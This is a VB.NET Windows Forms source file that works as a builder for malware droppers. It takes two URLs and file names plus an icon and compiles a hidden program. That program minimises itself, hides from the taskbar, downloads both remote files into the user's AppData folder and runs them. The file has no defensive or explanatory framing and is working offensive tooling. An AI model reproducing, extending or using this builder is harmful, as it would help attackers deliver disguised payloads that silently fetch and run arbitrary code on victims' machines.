Imports System.CodeDom.Compiler
Public Class Form4
    Dim file1, file2 As String
    Dim sCode1 As String
    Dim teststring1() As String
    Dim IconFile As String
    Public dGVzdHBhdGg As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    Sub CreateExe(ByVal Destination As String)
        Dim cp1 As New CompilerParameters

        cp1.ReferencedAssemblies.Add("System.dll")
        cp1.ReferencedAssemblies.Add(dGVzdHBhdGg & "\Z33nie\System.Windows.Forms.dll")
        cp1.ReferencedAssemblies.Add(dGVzdHBhdGg & "\Z33nie\System.Drawing.dll")
        cp1.ReferencedAssemblies.Add(Application.StartupPath & "\Resources\" & "System.Core.dll")

        cp1.CompilerOptions = " /target:winexe /m:Form1 /optimize /win32icon:" + IconFile

        Dim Provider As New VBCodeProvider

        cp1.GenerateExecutable = True
        cp1.OutputAssembly = Destination
        cp1.MainClass = "Form1"

        Dim errors As System.CodeDom.Compiler.CompilerResults = Provider.CompileAssemblyFromSource(cp1, sCode1)
        If errors.Errors.HasErrors Then
            MessageBox.Show(errors.Errors(0).ToString)
        End If
    End Sub
    Sub createFileforCompile(ByVal exefile As String)
        Dim codeline0 As String = "Imports System.Windows.Forms"
        Dim codeline1 As String = "Imports System"
        Dim codeline2 As String = "Imports System.Environment"
        Dim codeline3 As String = "Imports System.Net"
        Dim codeline4 As String = "Imports System.Diagnostics"
        Dim codeline5 As String = "Public Class Form1"
        Dim codeline6 As String = "Inherits System.Windows.Forms.Form"
        Dim codeline7 As String = "Public dGVzdHBhdGg As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)"
        Dim codeline8 As String = "Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load"
        Dim codeline9 As String = " "
        Dim codeline10 As String = "Me.Hide()"
        Dim codeline11 As String = "Me.ShowInTaskbar = False"
        Dim codeline12 As String = "Me.WindowState = FormWindowState.Minimized"
        Dim codeline13 As String = "DownloadFile" + "(""" + TextBox1.Text + """, dGVzdHBhdGg & " + """\" + TextBox3.Text + """)"
        Dim codeline14 As String = "DownloadFile" + "(""" + TextBox2.Text + """, dGVzdHBhdGg & " + """\" + TextBox4.Text + """)"
        Dim codeline15 As String = "Process.Start(dGVzdHBhdGg & " + """\" + TextBox3.Text + """)"
        Dim codeline16 As String = "Process.Start(dGVzdHBhdGg & " + """\" + TextBox4.Text + """)"
        Dim codeline17 As String = "End Sub"
        Dim codeline18 As String = "Public Sub DownloadFile(ByVal _URL As String, ByVal _SaveAs As String)"
        Dim codeline19 As String = "Try"
        Dim codeline20 As String = "Dim _WebClient As New System.Net.WebClient()"
        Dim codeline21 As String = "_WebClient.DownloadFile(_URL, _SaveAs)"
        Dim codeline22 As String = "Catch _Exception As Exception"
        Dim codeline23 As String = "Console.WriteLine" + "(""" + "Exception caught in process: {0}" + """, _Exception.ToString())"
        Dim codeline24 As String = "End Try"
        Dim codeline25 As String = "End Sub"
        Dim codeline26 As String = " "
        Dim codeline27 As String = "End Class"

        teststring1 = New String(27) {codeline0, codeline1, codeline2, codeline3, codeline4, codeline5, codeline6, codeline7, codeline8, codeline9, codeline10, codeline11, codeline12, codeline13, codeline14, codeline15, codeline16, codeline17, codeline18, codeline19, codeline20, codeline21, codeline22, codeline23, codeline24, codeline25, codeline26, codeline27}

        sCode1 = String.Join(vbNewLine, teststring1)
    End Sub

    Public Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        If TextBox1.Text = "" Or TextBox2.Text = "" Or TextBox3.Text = "" Or TextBox4.Text = "" Then
            MsgBox("Please enter all the details! File1(URL and Name), File2(URL and Name)")

        Else

            Dim sfd As New SaveFileDialog
            sfd.Filter = "Exe Files|*.exe"
            Dim outfile As String = ""
            Dim exefile As String = ""
            If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
                outfile = sfd.FileName
            Else
                Exit Sub
            End If
            Dim ofd As New OpenFileDialog
            ofd.Filter = "Icon Files|*.ico"
            If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
                IconFile = ofd.FileName
            Else
                Exit Sub
            End If
            createFileforCompile(exefile)
            CreateExe(outfile)

            MsgBox("Done! :)")
            Me.Close()
        End If
    End Sub

    Private Sub Button3_MouseHover(sender As Object, e As EventArgs) Handles Button3.MouseHover
        Button3.BackColor = Color.DarkGray
    End Sub

    Private Sub Button3_MouseLeave(sender As Object, e As EventArgs) Handles Button3.MouseLeave
        Button3.BackColor = Color.Black
    End Sub
End Class